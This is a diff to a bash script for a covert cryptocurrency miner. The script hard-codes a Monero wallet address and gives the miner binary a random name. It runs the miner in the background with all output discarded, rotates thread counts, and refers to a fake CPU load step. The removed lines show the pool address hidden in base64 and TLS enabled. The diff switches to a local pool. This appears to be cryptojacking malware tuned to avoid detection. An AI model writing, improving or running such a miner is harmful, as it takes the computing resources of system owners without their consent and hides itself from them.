@@ -1,8 +1,8 @@
-#!/bin/bash 
+#!/bin/bash
 
 ### BASIC CONFIG ###
 WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
-POOL=$(echo 'cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM=' | base64 -d)
+POOL="192.168.20.4:3333"  # Change port if different
 RAND_NAME=$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)
 WORKER_ID="worker-$(hostname | tr -dc a-z0-9)"
 
@@ -46,7 +46,7 @@ echo "[+] Fake CPU load started."
 start_mining() {
     THREADS=$(shuf -i 12-16 -n 1)
     echo "[*] Starting mining with $THREADS threads..."
-    nohup ./$RAND_NAME -o $POOL -u $WALLET -k -p $WORKER_ID --tls --donate-level 1 -t $THREADS >/dev/null 2>&1 &
+    nohup ./$RAND_NAME -o $POOL -u $WALLET -k -p $WORKER_ID -t $THREADS >/dev/null 2>&1 &
     MINER_PID=$!
 }
 
@@ -63,7 +63,7 @@ start_mining
 
 ### LOOP: CHANGE THREADS EVERY 5 MINUTES ###
 while true; do
-    sleep 300  # 5 minutes
+    sleep 6000
     stop_mining
     start_mining
 done
